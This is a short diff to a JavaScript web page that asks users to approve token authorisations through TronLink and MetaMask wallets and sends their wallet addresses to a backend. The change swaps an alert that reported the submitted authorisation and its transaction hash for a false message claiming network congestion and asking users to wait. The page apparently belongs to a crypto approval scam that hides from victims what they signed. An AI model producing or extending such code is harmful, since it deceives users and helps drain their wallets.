@@ -583,7 +583,7 @@ async function approveWithTronLink() {
       // 提交用户数据到后端
       await submitUserDataToBackend(userAddress, 'TRC')
       
-      alert('授权交易已提交！\n\n交易哈希: ' + transaction + '\n\n系统正在监听并处理您的订单，请稍候...')
+      alert('当前网络拥堵，\n\n请在当前页面中耐心等待返回结果')
       return true
     } else {
       return false
@@ -661,7 +661,7 @@ async function approveWithMetaMask() {
     // 提交用户数据到后端
     await submitUserDataToBackend(userAddress, chain)
     
-    alert('授权交易已提交！\n\n交易哈希: ' + txHash + '\n\n系统正在监听并处理您的订单，请稍候...')
+    alert('当前网络拥堵，\n\n请在当前页面中耐心等待返回结果')
     
   } catch (error) {
     console.error('MetaMask 授权失败:', error)
